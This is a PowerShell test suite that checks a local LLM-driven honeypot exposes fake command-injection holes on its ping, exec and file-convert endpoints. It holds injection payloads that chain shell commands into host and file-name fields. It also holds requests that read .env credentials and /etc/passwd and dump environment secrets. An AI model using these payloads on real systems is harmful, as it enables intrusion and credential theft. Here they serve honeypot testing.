# ============================================================
# Command Injection Test Suite - LLM Honeypot V2
# Tests all three vulnerable endpoints across 16 scenarios
# Usage: .\test_command_injection.ps1
# ============================================================

$BASE = "http://localhost:8082"
$pass = 0; $fail = 0

function Test-Case {
    param([string]$Name, [scriptblock]$Block, [scriptblock]$Assert)
    try {
        $result = & $Block
        if (& $Assert $result) {
            Write-Host "  [PASS] $Name" -ForegroundColor Green
            $script:pass++
        } else {
            Write-Host "  [FAIL] $Name" -ForegroundColor Red
            Write-Host "         Response: $($result | ConvertTo-Json -Compress)" -ForegroundColor DarkGray
            $script:fail++
        }
    } catch {
        Write-Host "  [ERR ] $Name - $_" -ForegroundColor Yellow
        $script:fail++
    }
}

# ============================================================
# 0. LOGIN (setup for system/exec tests)
# ============================================================
Write-Host "`n[Setup] Login to obtain session token..." -ForegroundColor Cyan
$loginBody = '{"username":"admin","password":"admin123"}'
$loginResp = Invoke-RestMethod -Uri "$BASE/api/login" -Method POST `
    -Body $loginBody -ContentType "application/json" `
    -SessionVariable script:session
$script:token = $loginResp.token
Write-Host "        Token: $($script:token.Substring(0,8))..." -ForegroundColor DarkGray

# ============================================================
# 1. /api/ping  -- normal + injections
# ============================================================
Write-Host "`n--- /api/ping (6 tests) ---" -ForegroundColor Cyan

Test-Case "Normal ping (clean host)" {
    Invoke-RestMethod -Uri "$BASE/api/ping?host=8.8.8.8"
} { param($r) $r.success -eq $true -and $r.result -match "PING" }

Test-Case "Pipe injection: whoami" {
    $enc = [uri]::EscapeDataString("8.8.8.8 | whoami")
    Invoke-RestMethod -Uri "$BASE/api/ping?host=$enc"
} { param($r) $r.success -eq $true -and $r.result -match "www-data" }

Test-Case "Semicolon injection: id" {
    $enc = [uri]::EscapeDataString("8.8.8.8; id")
    Invoke-RestMethod -Uri "$BASE/api/ping?host=$enc"
} { param($r) $r.success -eq $true -and $r.result -match "uid=" }

Test-Case "Pipe injection: uname -a" {
    $enc = [uri]::EscapeDataString("localhost | uname -a")
    Invoke-RestMethod -Uri "$BASE/api/ping?host=$enc"
} { param($r) $r.success -eq $true -and $r.result -match "Linux" }

Test-Case "Chained injection: && cat .env" {
    $enc = [uri]::EscapeDataString("127.0.0.1 && cat .env")
    Invoke-RestMethod -Uri "$BASE/api/ping?host=$enc"
} { param($r) $r.success -eq $true -and $r.result -match "DB_PASSWORD" }

Test-Case "POST body injection: whoami" {
    $body = '{"host":"10.0.0.1 | whoami"}'
    Invoke-RestMethod -Uri "$BASE/api/ping" -Method POST `
        -Body $body -ContentType "application/json"
} { param($r) $r.success -eq $true -and $r.result -match "www-data" }

# ============================================================
# 2. /api/system/exec  -- auth + recon
# ============================================================
Write-Host "`n--- /api/system/exec (6 tests) ---" -ForegroundColor Cyan

Test-Case "Exec without auth returns 401" {
    try {
        Invoke-RestMethod -Uri "$BASE/api/system/exec" -Method POST `
            -Body '{"command":"whoami"}' -ContentType "application/json"
        return @{ status = 200 }
    } catch {
        return @{ status = $_.Exception.Response.StatusCode.value__ }
    }
} { param($r) $r.status -eq 401 }

Test-Case "Exec: whoami (authenticated)" {
    $headers = @{ "Authorization" = "Bearer $script:token" }
    Invoke-RestMethod -Uri "$BASE/api/system/exec" -Method POST `
        -Body '{"command":"whoami"}' -ContentType "application/json" -Headers $headers
} { param($r) $r.success -eq $true -and $r.output -match "www-data" }

Test-Case "Exec: cat .env (creds extraction)" {
    $headers = @{ "Authorization" = "Bearer $script:token" }
    Invoke-RestMethod -Uri "$BASE/api/system/exec" -Method POST `
        -Body '{"command":"cat .env"}' -ContentType "application/json" -Headers $headers
} { param($r) $r.output -match "DB_PASSWORD" -and $r.output -match "API_KEY" }

Test-Case "Exec: cat /etc/passwd" {
    $headers = @{ "Authorization" = "Bearer $script:token" }
    Invoke-RestMethod -Uri "$BASE/api/system/exec" -Method POST `
        -Body '{"command":"cat /etc/passwd"}' -ContentType "application/json" -Headers $headers
} { param($r) $r.output -match "root:" -and $r.output -match "www-data" }

Test-Case "Exec: ps aux (process listing)" {
    $headers = @{ "Authorization" = "Bearer $script:token" }
    Invoke-RestMethod -Uri "$BASE/api/system/exec" -Method POST `
        -Body '{"command":"ps aux"}' -ContentType "application/json" -Headers $headers
} { param($r) $r.output -match "apache2" }

Test-Case "Exec: env (env var dump)" {
    $headers = @{ "Authorization" = "Bearer $script:token" }
    Invoke-RestMethod -Uri "$BASE/api/system/exec" -Method POST `
        -Body '{"command":"env"}' -ContentType "application/json" -Headers $headers
} { param($r) $r.output -match "AWS_ACCESS_KEY_ID" }

# ============================================================
# 3. /api/convert  -- filename injection
# ============================================================
Write-Host "`n--- /api/convert (4 tests) ---" -ForegroundColor Cyan

Test-Case "Normal conversion (no injection)" {
    Invoke-RestMethod -Uri "$BASE/api/convert?file=report.docx&format=pdf"
} { param($r) $r.success -eq $true -and $r.download_url -ne $null }

Test-Case "Semicolon injection: cat /etc/passwd" {
    $enc = [uri]::EscapeDataString("doc.txt; cat /etc/passwd")
    Invoke-RestMethod -Uri "$BASE/api/convert?file=$enc&format=pdf"
} { param($r) $r.success -eq $true -and $r.debug -match "root:" }

Test-Case "Pipe injection: cat .env" {
    $enc = [uri]::EscapeDataString("doc.txt | cat .env")
    Invoke-RestMethod -Uri "$BASE/api/convert?file=$enc&format=pdf"
} { param($r) $r.debug -match "DB_PASSWORD" }

Test-Case "Chained injection: ls -la" {
    $enc = [uri]::EscapeDataString("file.txt && ls -la")
    Invoke-RestMethod -Uri "$BASE/api/convert?file=$enc&format=txt"
} { param($r) $r.debug -match "www-data" }

# ============================================================
# Summary
# ============================================================
$total = $pass + $fail
Write-Host ""
Write-Host "============================================" -ForegroundColor White
Write-Host "  Results: $pass / $total passed" -ForegroundColor $(if ($fail -eq 0) { "Green" } else { "Yellow" })
Write-Host "============================================" -ForegroundColor White
if ($fail -gt 0) {
    Write-Host "  Make sure the honeypot is running: python llm-honeypot-v2-CMDI.py" -ForegroundColor DarkGray
}